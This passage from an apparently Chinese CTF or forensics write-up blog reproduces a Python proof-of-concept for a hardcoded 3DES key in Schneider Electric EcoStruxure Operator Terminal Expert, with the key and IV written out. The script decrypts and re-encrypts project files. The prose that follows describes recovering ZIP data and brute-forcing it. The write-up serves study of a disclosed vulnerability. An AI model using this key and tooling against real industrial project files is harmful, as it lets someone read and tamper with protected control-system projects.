+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Schneider Electric EcoStruxure Operator Terminal Expert Hardcoded Cryptographic Key Information Disclosure Vulnerability
+</span></span></span><span class="line"><span class="cl"><span class="s2">SRC ....: SRC-2020-0010
+</span></span></span><span class="line"><span class="cl"><span class="s2">CVE ....: N/A
+</span></span></span><span class="line"><span class="cl"><span class="s2">File ...: EcoStruxure Operator Terminal Expert V3.1.iso
+</span></span></span><span class="line"><span class="cl"><span class="s2">SHA1 ...: 386312d68ba5e6a98df24258f2fbcfb2d8c8521b
+</span></span></span><span class="line"><span class="cl"><span class="s2">Download: https://download.schneider-electric.com/files?p_File_Name=EcoStruxure+Operator+Terminal+Expert+V3.1.iso
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">re</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">sys</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">glob</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">zlib</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">zipfile</span>
+</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">Crypto</span><span class="o">.</span><span class="n">Cipher</span> <span class="n">import</span> <span class="n">DES3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># hardcoded values</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span>  <span class="o">=</span> <span class="p">[</span> <span class="mi">202</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">154</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">219</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">145</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">254</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">253</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">213</span><span class="p">,</span> <span class="mi">134</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">78</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">iv</span>   <span class="o">=</span> <span class="p">[</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">44</span><span class="p">,</span> <span class="mi">250</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">155</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">des3</span> <span class="o">=</span> <span class="p">[</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">127</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">plen</span>  <span class="o">=</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_equal</span><span class="p">(</span><span class="n">iterator</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">   <span class="c1"># if all the values are the same then its padding...</span>
+</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">len</span><span class="p">(</span><span class="n">set</span><span class="p">(</span><span class="n">iterator</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_inflate</span><span class="p">(</span><span class="n">decoded_data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">decoded_data</span><span class="p">,</span> <span class="o">-</span><span class="mi">15</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_deflate</span><span class="p">(</span><span class="n">string_val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">compressed</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">compress</span><span class="p">(</span><span class="n">string_val</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">compressed</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete_folder</span><span class="p">(</span><span class="n">top</span><span class="p">)</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">top</span><span class="p">,</span> <span class="n">topdown</span><span class="o">=</span><span class="n">False</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">dirs</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">rmdir</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">rmdir</span><span class="p">(</span><span class="n">top</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) unpacking: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decr</span> <span class="o">=</span> <span class="n">DES3</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">bytes</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">DES3</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">bytes</span><span class="p">(</span><span class="n">iv</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">default_data</span> <span class="o">=</span> <span class="n">bytes</span><span class="p">([</span><span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">list</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">10</span><span class="p">))</span> <span class="o">==</span> <span class="n">des3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">encrypted</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">raw_data</span> <span class="o">=</span> <span class="n">decr</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">check_equal</span><span class="p">(</span><span class="n">list</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">raw_data</span> <span class="o">=</span> <span class="n">_inflate</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">raw_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># now that we have the decrypted data, let&#39;s overwrite the file...</span>
+</span></span><span class="line"><span class="cl">    <span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) packing: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encr</span> <span class="o">=</span> <span class="n">DES3</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">bytes</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">DES3</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">bytes</span><span class="p">(</span><span class="n">iv</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">packed_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">packed_data</span> <span class="o">==</span> <span class="n">bytes</span><span class="p">([</span><span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">packed_data</span> <span class="o">=</span> <span class="n">_deflate</span><span class="p">(</span><span class="n">packed_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># padding for encryption, same as schneider</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pad</span> <span class="o">=</span> <span class="n">plen</span> <span class="o">-</span> <span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="n">packed_data</span><span class="p">)</span> <span class="o">%</span> <span class="n">plen</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># if we just have padding in there, then dont bother adding more padding now...</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">len</span><span class="p">(</span><span class="n">packed_data</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pad</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">packed_data</span> <span class="o">+=</span> <span class="n">bytes</span><span class="p">([</span><span class="n">pad</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">encr_data</span> <span class="o">=</span> <span class="n">bytes</span><span class="p">(</span><span class="n">des3</span><span class="p">)</span> <span class="o">+</span> <span class="n">encr</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">packed_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">encr_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">project</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">z</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">project</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">output_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">z</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) unpacking to </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">output_dir</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">output_dir</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(-) </span><span class="si">%s</span><span class="s2"> already exists!&#34;</span> <span class="o">%</span> <span class="n">output_dir</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">False</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zip_obj</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">z</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zip_obj</span><span class="o">.</span><span class="n">extractall</span><span class="p">(</span><span class="n">output_dir</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zip_obj</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># two levels deep, we can do more if we need to</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">list</span><span class="p">(</span><span class="n">set</span><span class="p">(</span><span class="n">glob</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="n">output_dir</span> <span class="o">+</span> <span class="s1">&#39;/**/**/*.*&#39;</span><span class="p">,</span> <span class="n">recursive</span><span class="o">=</span><span class="n">True</span><span class="p">))):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decrypt_file</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) unpacked and decrypted: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">project</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pack</span><span class="p">(</span><span class="n">project</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">z</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">project</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">output_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">z</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># two levels deep, we can do more if we need to</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">list</span><span class="p">(</span><span class="n">set</span><span class="p">(</span><span class="n">glob</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="n">output_dir</span> <span class="o">+</span> <span class="s1">&#39;/**/**/*.*&#39;</span><span class="p">,</span> <span class="n">recursive</span><span class="o">=</span><span class="n">True</span><span class="p">))):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&#34;[Content_Types].xml&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">encrypt_file</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">zf</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">project</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">list</span><span class="p">(</span><span class="n">set</span><span class="p">(</span><span class="n">glob</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">output_dir</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/**/**/*.*&#39;</span><span class="p">,</span> <span class="n">recursive</span><span class="o">=</span><span class="n">True</span><span class="p">))):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">zf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">file</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">:]))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">zf</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">delete_folder</span><span class="p">(</span><span class="n">output_dir</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) packed and encrypted: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">project</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) usage: </span><span class="si">%s</span><span class="s2">[options]&#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) eg: </span><span class="si">%s</span><span class="s2"> sample.vxdz unpack&#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) eg: </span><span class="si">%s</span><span class="s2"> sample.vxdz pack&#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&#34;unpack&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">unpack</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">c</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&#34;pack&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pack</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(-) invalid option!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Security.db</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031131714677.png?imageSlim" title="image-20241031131714677" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031131714677.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031131714677.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031131714677.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031131714677.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031131714677.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031131714677">
+    </a></figure></p>
+<h3 id="屁" class="headerLink">
+    <a href="#%e5%b1%81" class="header-mark"></a>屁</h3><p>找到文件头以 <code>PK</code> 开头的文件，将其后缀改为 ZIP</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132317891.png?imageSlim" title="image-20241031132317891" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132317891.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132317891.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132317891.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132317891.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132317891.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031132317891">
+    </a></figure></p>
+<p>可以看到压缩方法采用 <strong>「Deflate」</strong> 算法 ，没有加密，这意味着**「数据区」**的文件数据可以直接使用 <strong>「<code>zlib.decompress</code>」</strong> 进行解压。</p>
+<p>同时可确定最小的文件即为文件尾。</p>
+<p>删除 ZIP 的文件头尾后，编写代码进行爆破。</p>
+<p>删除第一个文件头部</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132916243.png?imageSlim" title="image-20241031132916243" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132916243.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132916243.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132916243.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132916243.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132916243.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031132916243">
+    </a></figure></p>
+<p>删除最后文件尾部</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132946706.png?imageSlim" title="image-20241031132946706" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132946706.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132946706.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132946706.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132946706.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031132946706.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031132946706">
+    </a></figure></p>
+<p>写脚本进行爆破</p>
+<p>（脚本参考官方wp）</p>
+<div class="highlight"><div class="chroma">
